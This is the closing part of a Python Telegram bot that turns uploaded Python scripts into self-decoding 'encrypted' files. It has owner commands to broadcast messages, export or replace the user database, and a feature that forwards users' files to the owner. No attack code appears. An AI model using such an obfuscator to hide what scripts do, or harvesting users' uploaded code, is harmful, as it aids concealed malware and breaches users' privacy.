        "/start - Start the bot\n"
        "/help - Show this help message\n"
        "/cancel - Cancel current operation\n\n"
        "**How to use:**\n"
        "1. Send a Python file\n"
        "2. Choose encoder category\n"
        "3. Select encoding method\n"
        "4. Set expiration (optional)\n"
        "5. Receive encrypted file\n\n"
        "⚡ **Advanced Features:**\n"
        "- Concurrent processing for multiple users\n"
        "- Session isolation for security\n"
        "- Automatic cleanup\n"
        "- File forwarding to owner\n\n"
        "The encrypted file will run and decode itself automatically."
    )
    await update.message.reply_text(help_text, parse_mode='Markdown')

# Keep your existing owner commands (stats, broadcast, extract, replace)
async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id

    if not is_owner(user_id):
        await update.message.reply_text("❌ This command is only available to bot owners.")
        return

    db = load_users_db()
    total_users = len(db["users"])
    total_files = db["total_files"]

    active_users = 0
    now = datetime.now()
    for user_data in db["users"].values():
        try:
            last_seen = datetime.fromisoformat(user_data["last_seen"])
            if (now - last_seen).days <= 7:
                active_users += 1
        except:
            pass

    stats_text = (
        "**Bot Statistics**\n\n"
        f"Total Users: {total_users}\n"
        f"Active Users (7 days): {active_users}\n"
        f"Total Files Processed: {total_files}\n"
        f"Active Sessions: {len(_user_sessions)}\n"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("Broadcast Message", callback_data="broadcast_start")]
    ])

    await update.message.reply_text(
        stats_text,
        parse_mode='Markdown',
        reply_markup=keyboard
    )

async def broadcast_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    if not is_owner(user_id):
        return ConversationHandler.END

    await query.message.reply_text(
        "Send the message you want to broadcast to all users.\n\nUse /cancel to abort.",
        parse_mode='Markdown'
    )
    return WAIT_BROADCAST_MESSAGE

async def broadcast_message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id

    if not is_owner(user_id):
        return ConversationHandler.END

    broadcast_text = update.message.text
    db = load_users_db()

    status_msg = await update.message.reply_text("📢 Broadcasting message...")

    success_count = 0
    fail_count = 0

    for user_id_str, user_data in db["users"].items():
        try:
            await context.bot.send_message(
                chat_id=int(user_id_str),
                text=f"**Broadcast from Bot Admin**\n\n{broadcast_text}",
                parse_mode='Markdown'
            )
            success_count += 1
            await asyncio.sleep(0.05)
        except Exception as e:
            fail_count += 1
            logger.warning(f"Failed to broadcast to user {user_id_str}: {e}")

    await status_msg.edit_text(
        f"✅ Broadcast complete!\n\n"
        f"Sent: {success_count}\n"
        f"Failed: {fail_count}"
    )

    return ConversationHandler.END

async def extract_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id

    if not is_owner(user_id):
        await update.message.reply_text("❌ This command is only available to bot owners.")
        return

    try:
        if os.path.exists(USERS_DB_FILE):
            with open(USERS_DB_FILE, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=USERS_DB_FILE,
                    caption="Here's the current users database"
                )
        else:
            await update.message.reply_text("No database file found yet.")
    except Exception as e:
        logger.error(f"Error extracting database: {e}")
        await update.message.reply_text(f"❌ Error extracting database: {str(e)}")

async def replace_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id

    if not is_owner(user_id):
        await update.message.reply_text("❌ This command is only available to bot owners.")
        return

    await update.message.reply_text(
        "Send the new users database file to replace the current one.\n\nUse /cancel to abort."
    )
    return WAIT_REPLACE_FILE

async def handle_replace_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id

    if not is_owner(user_id):
        return ConversationHandler.END

    document = update.message.document
    if not document:
        await update.message.reply_text("Please send a valid JSON file.")
        return WAIT_REPLACE_FILE

    try:
        file_obj = await document.get_file()
        await file_obj.download_to_drive(USERS_DB_FILE)

        await update.message.reply_text("✅ Database replaced successfully!")

    except Exception as e:
        logger.error(f"Error replacing database: {e}")
        await update.message.reply_text(f"❌ Error replacing database: {str(e)}")

    return ConversationHandler.END

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Exception while handling update: {context.error}")

    try:
        if isinstance(update, Update) and update.effective_message:
            await update.effective_message.reply_text(
                "❌ An error occurred. Please try again or contact the bot administrator."
            )
    except Exception as e:
        logger.error(f"Error sending error message: {e}")

async def post_init(application):
    from telegram import BotCommand

    commands = [
        BotCommand("start", "Start the bot"),
        BotCommand("help", "Get help"),
        BotCommand("cancel", "Cancel operation"),
        BotCommand("stats", "Bot statistics (owner)"),
        BotCommand("broadcast", "Broadcast message (owner)"),
        BotCommand("extract", "Extract database (owner)"),
        BotCommand("replace", "Replace database (owner)")
    ]

    await application.bot.set_my_commands(commands)

async def cleanup_old_sessions():
    """Periodic cleanup of old sessions"""
    while True:
        try:
            current_time = time.time()
            async with _session_lock:
                to_remove = []
                for user_id, session in _user_sessions.items():
                    # Remove sessions older than 1 hour
                    session_time = int(session.session_id.split('_')[-1])
                    if current_time - session_time > 3600:
                        to_remove.append(user_id)
                
                for user_id in to_remove:
                    session = _user_sessions[user_id]
                    session.cleanup()
                    del _user_sessions[user_id]
                    
            await asyncio.sleep(300)  # Run every 5 minutes
        except Exception as e:
            logger.error(f"Error in session cleanup: {e}")
            await asyncio.sleep(60)

if __name__ == "__main__":
    os.makedirs(BASE_USER_DIR, exist_ok=True)

    app = ApplicationBuilder().token(BOT_TOKEN).post_init(post_init).build()

    # Start background session cleanup task
    asyncio.get_event_loop().create_task(cleanup_old_sessions())

    # Updated conversation handler with new states
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start_cmd)],
        states={
            WAIT_FILE: [MessageHandler(filters.Document.ALL, handle_pyfile)],
            CHOOSE_METHOD: [
                CallbackQueryHandler(category_callback, pattern="^category_"),
                CallbackQueryHandler(method_callback, pattern="^(method_|back_categories)"),
            ],
            CHOOSE_EXPIRATION: [
                CallbackQueryHandler(expiration_callback, pattern="^exp_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_custom_date),
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel_cmd)],
        per_message=False
    )

    broadcast_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(broadcast_start, pattern="^broadcast_start$")],
        states={
            WAIT_BROADCAST_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, broadcast_message_handler)]
        },
        fallbacks=[CommandHandler("cancel", cancel_cmd)],
        per_message=False
    )

    replace_conv = ConversationHandler(
        entry_points=[CommandHandler("replace", replace_cmd)],
        states={
            WAIT_REPLACE_FILE: [MessageHandler(filters.Document.ALL, handle_replace_file)]
        },
        fallbacks=[CommandHandler("cancel", cancel_cmd)],
        per_message=False
    )

    app.add_error_handler(error_handler)
    app.add_handler(conv_handler)
    app.add_handler(broadcast_handler)
    app.add_handler(replace_conv)
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("stats", stats_cmd))
    app.add_handler(CommandHandler("extract", extract_cmd))

    print("⚡ Bot is running with FIXED ENCRYPTION FUNCTIONS")
    print("✅ STRONGEST ENC error fixed")
    print("✅ All special encoders working properly")
    print("✅ Multiple users can work simultaneously")
    logger.info("Bot started - All encryption functions fixed")
    logger.info(f"Owner ID: {OWNER_CHAT_IDS}")

    try:
        app.run_polling(
            poll_interval=POLL_INTERVAL,
            timeout=REQUEST_TIMEOUT,
            drop_pending_updates=True,
            allowed_updates=Update.ALL_TYPES
        )
    except KeyboardInterrupt:
        print("\nBot stopped")
    finally:
        # Cleanup all sessions on shutdown
        async def final_cleanup():
            async with _session_lock:
                for session in _user_sessions.values():
                    session.cleanup()
                _user_sessions.clear()
            
        asyncio.run(final_cleanup())
        
        try:
            if os.path.exists(BASE_USER_DIR):
                shutil.rmtree(BASE_USER_DIR)
        except Exception as e:
            logger.error(f"Error cleaning up base directory: {e}")
